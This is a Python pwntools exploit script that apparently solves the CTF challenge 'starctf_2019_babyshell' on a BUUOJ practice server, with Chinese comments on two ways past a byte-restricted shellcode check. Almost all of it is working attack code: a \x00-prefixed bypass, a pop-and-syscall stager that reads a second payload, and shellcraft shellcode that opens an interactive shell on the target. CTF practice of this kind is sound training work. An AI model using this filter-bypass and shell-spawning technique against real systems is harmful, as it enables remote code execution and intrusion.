#!/usr/bin/python3
from pwn import *
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 29050
elfpath = './starctf_2019_babyshell'
ldpath = ''
libcpath = ''
# libc = ELF(libcpath)

elf = ELF(elfpath)
context.binary = elf


if args.LOCAL:
    p = process([elf.path])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success("{}: {}".format(func, hex(address)))

# start pwning
'''
限定了可用字节的shellcode
解决方法有两种：
1、 \x00字节开头的指令绕过检查，然后接正常的shellcode
2、将可用字节转成汇编代码，看看有哪些可以用的指令，然后发挥聪明才智
'''

ru(b'give me shellcode, plz:\n')

# 解法1：\x00绕过
# payload = b'\x00j\x00' + asm(shellcraft.sh())
# sl(payload)

# 解法2：参考 https://www.cnblogs.com/Rookle/p/12895895.html
payload1 = asm(
'''
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
pop rdi
pop rdx          # 控制rdx
pop rdi          # 控制rdi
syscall
''')
# print(len(payload))

sl(payload1)
payload2 = b'a'*len(payload1) + asm(shellcraft.sh())
sl(payload2)
shell()

